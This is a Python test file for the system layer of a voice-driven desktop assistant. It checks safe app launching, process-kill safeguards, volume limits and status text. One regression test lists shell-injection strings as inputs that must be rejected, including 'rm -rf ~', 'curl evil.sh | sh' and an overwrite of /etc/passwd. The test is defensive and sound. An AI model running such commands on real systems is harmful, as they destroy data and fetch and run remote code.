"""A camada de sistema recebe texto ditado por voz: ela é a fronteira de segurança."""

import pytest

from shimeji import sistema


@pytest.mark.parametrize("alvo, url", [
    ("youtube", "https://youtube.com"),
    ("abre o github pra mim", "https://github.com"),
    ("https://exemplo.com", "https://exemplo.com"),
])
def test_resolve_sites_conhecidos(alvo, url):
    assert sistema.resolver_site(alvo) == url


def test_alvo_desconhecido_nao_e_site():
    assert sistema.resolver_site("meu_programa_local") is None


@pytest.mark.parametrize("injecao", [
    "firefox; rm -rf ~",
    "ls && curl evil.sh | sh",
    "algo `whoami`",
    "arquivo > /etc/passwd",
    "cmd $(id)",
])
def test_nao_executa_metacaracteres_de_shell(injecao, monkeypatch):
    """Regressão crítica: a versão anterior fazia Popen(alvo, shell=True).

    Qualquer frase ditada com `;` ou `&&` virava execução de comando arbitrário.
    Agora o alvo com metacaractere nunca chega ao executor.
    """
    monkeypatch.setattr(sistema.shutil, "which", lambda _: "/bin/sh")
    assert sistema._abrir_executavel(injecao) is False


def test_abrir_alvo_desconhecido_cai_para_busca(monkeypatch):
    abertas = []
    monkeypatch.setattr(sistema, "abrir_no_navegador", abertas.append)
    monkeypatch.setattr(sistema, "_abrir_com_desktop", lambda _: False)
    monkeypatch.setattr(sistema, "_abrir_executavel", lambda _: False)

    assert sistema.abrir_alvo("coisa que não existe") == "busca"
    assert "google.com/search" in abertas[0]


def test_abrir_alvo_vazio_e_erro():
    with pytest.raises(sistema.ErroDeSistema):
        sistema.abrir_alvo("   ")


def test_abrir_site_conhecido(monkeypatch):
    abertas = []
    monkeypatch.setattr(sistema, "abrir_no_navegador", abertas.append)
    assert sistema.abrir_alvo("youtube") == "site"
    assert abertas == ["https://youtube.com"]


def test_pesquisa_escapa_a_query(monkeypatch):
    abertas = []
    monkeypatch.setattr(sistema, "abrir_no_navegador", abertas.append)
    sistema.pesquisar("c++ & python")
    assert " " not in abertas[0] and "&" not in abertas[0].split("q=")[1]


def test_clima_escapa_a_cidade(monkeypatch):
    abertas = []
    monkeypatch.setattr(sistema, "abrir_no_navegador", abertas.append)
    sistema.abrir_clima("São Paulo")
    assert abertas[0].startswith("https://wttr.in/S%C3%A3o%20Paulo")


@pytest.mark.parametrize("nome", ["python3", "systemd", "Xorg", "explorer.exe", "gnome-shell"])
def test_processos_criticos_sao_protegidos(nome):
    assert sistema.processo_protegido(nome) is True


@pytest.mark.parametrize("nome", ["firefox", "code", "spotify"])
def test_processos_comuns_nao_sao_protegidos(nome):
    assert sistema.processo_protegido(nome) is False


@pytest.mark.parametrize("alvo", ["", "a", "ab", "   "])
def test_recusa_encerrar_com_nome_curto(alvo):
    """'fecha a' não pode virar um massacre de processos por substring."""
    with pytest.raises(sistema.ErroDeSistema):
        sistema.encerrar_processos(alvo)


class ProcessoFalso:
    def __init__(self, pid, nome):
        self.info = {"pid": pid, "name": nome}
        self.encerrado = False

    def terminate(self):
        self.encerrado = True


def test_nunca_encerra_o_proprio_processo(monkeypatch):
    proprio = ProcessoFalso(4242, "python3")
    monkeypatch.setattr(sistema.psutil, "process_iter", lambda _: [proprio])
    encerrados, protegidos = sistema.encerrar_processos("python", pid_proprio=4242)
    assert (encerrados, protegidos) == (0, 1)
    assert proprio.encerrado is False


def test_nunca_encerra_processo_protegido(monkeypatch):
    critico = ProcessoFalso(1, "systemd")
    monkeypatch.setattr(sistema.psutil, "process_iter", lambda _: [critico])
    encerrados, protegidos = sistema.encerrar_processos("systemd", pid_proprio=999)
    assert (encerrados, protegidos) == (0, 1)
    assert critico.encerrado is False


def test_encerra_processo_comum(monkeypatch):
    alvo = ProcessoFalso(77, "firefox")
    monkeypatch.setattr(sistema.psutil, "process_iter", lambda _: [alvo])
    encerrados, _ = sistema.encerrar_processos("firefox", pid_proprio=999)
    assert encerrados == 1 and alvo.encerrado is True


@pytest.mark.parametrize("entrada, esperado", [(0, 0), (50, 50), (150, 100), (-20, 0), (None, 50)])
def test_volume_e_limitado_entre_0_e_100(entrada, esperado, monkeypatch):
    aplicados = []
    monkeypatch.setattr(sistema, "_volume_unix", aplicados.append)
    monkeypatch.setattr(sistema, "_volume_windows", aplicados.append)
    assert sistema.ajustar_volume(entrada) == esperado


def test_status_do_sistema_tem_valores_coerentes():
    status = sistema.coletar_status()
    assert 0 <= status.cpu <= 100
    assert 0 <= status.ram_percentual <= 100
    assert status.ram_total_gb > 0
    assert "CPU" in status.descrever()


# --- caminhos de abertura e volume por plataforma --------------------------
def test_abre_arquivo_existente_sem_shell(tmp_path, monkeypatch):
    arquivo = tmp_path / "nota.txt"
    arquivo.write_text("oi", encoding="utf-8")
    chamadas = []
    monkeypatch.setattr(sistema.sys, "platform", "linux")
    monkeypatch.setattr(sistema.subprocess, "Popen", lambda comando, **_: chamadas.append(comando))

    assert sistema._abrir_com_desktop(str(arquivo)) is True
    assert chamadas == [["xdg-open", str(arquivo)]]


def test_arquivo_inexistente_nao_e_aberto():
    assert sistema._abrir_com_desktop("/caminho/que/nao/existe") is False


def test_executavel_no_path_e_iniciado(monkeypatch):
    chamadas = []
    monkeypatch.setattr(sistema.shutil, "which", lambda _: "/usr/bin/firefox")
    monkeypatch.setattr(sistema.subprocess, "Popen", lambda comando, **_: chamadas.append(comando))

    assert sistema._abrir_executavel("firefox") is True
    assert chamadas == [["/usr/bin/firefox"]]


def test_executavel_ausente_no_path(monkeypatch):
    monkeypatch.setattr(sistema.shutil, "which", lambda _: None)
    assert sistema._abrir_executavel("nao_existe") is False


def test_volume_unix_usa_o_primeiro_controlador_disponivel(monkeypatch):
    import subprocess as sp

    monkeypatch.setattr(sistema.shutil, "which", lambda nome: "/usr/bin/pactl" if nome == "pactl" else None)
    executados = []

    def executar(comando, **_):
        executados.append(comando)
        return sp.CompletedProcess(comando, 0)

    monkeypatch.setattr(sistema.subprocess, "run", executar)
    sistema._volume_unix(30)
    assert executados[0][0] == "pactl" and "30%" in executados[0][-1]


def test_volume_unix_tenta_o_proximo_quando_o_primeiro_falha(monkeypatch):
    import subprocess as sp

    monkeypatch.setattr(sistema.shutil, "which", lambda _: "/usr/bin/qualquer")
    executados = []

    def executar(comando, **_):
        executados.append(comando[0])
        return sp.CompletedProcess(comando, 0 if comando[0] == "wpctl" else 1)

    monkeypatch.setattr(sistema.subprocess, "run", executar)
    sistema._volume_unix(50)
    assert executados[:2] == ["pactl", "wpctl"]


def test_volume_unix_sem_controlador_avisa(monkeypatch):
    monkeypatch.setattr(sistema.shutil, "which", lambda _: None)
    with pytest.raises(sistema.ErroDeSistema, match="nenhum controlador"):
        sistema._volume_unix(50)


def test_processo_zumbi_nao_interrompe_a_varredura(monkeypatch):
    class Zumbi:
        info = {"pid": 5, "name": "firefox"}

        def terminate(self):
            raise sistema.psutil.NoSuchProcess(5)

    saudavel = ProcessoFalso(6, "firefox")
    monkeypatch.setattr(sistema.psutil, "process_iter", lambda _: [Zumbi(), saudavel])
    encerrados, _ = sistema.encerrar_processos("firefox", pid_proprio=1)
    assert encerrados == 1 and saudavel.encerrado is True


def test_caminho_do_disco_por_plataforma(monkeypatch):
    monkeypatch.setattr(sistema.sys, "platform", "win32")
    assert sistema.caminho_do_disco() == "C:\\"
    monkeypatch.setattr(sistema.sys, "platform", "linux")
    assert sistema.caminho_do_disco() == "/"


def test_descricao_do_status_sem_bateria():
    status = sistema.StatusSistema(
        cpu=10, ram_percentual=50, ram_usada_gb=8, ram_total_gb=16,
        disco_percentual=40, disco_usado_gb=200, disco_total_gb=500,
        bateria_percentual=None, bateria_minutos=None,
    )
    texto = status.descrever()
    assert "Bateria" not in texto and "CPU em 10" in texto


def test_descricao_do_status_com_bateria():
    status = sistema.StatusSistema(
        cpu=10, ram_percentual=50, ram_usada_gb=8, ram_total_gb=16,
        disco_percentual=40, disco_usado_gb=200, disco_total_gb=500,
        bateria_percentual=85, bateria_minutos=120,
    )
    assert "Bateria em 85" in status.descrever() and "120 minutos" in status.descrever()
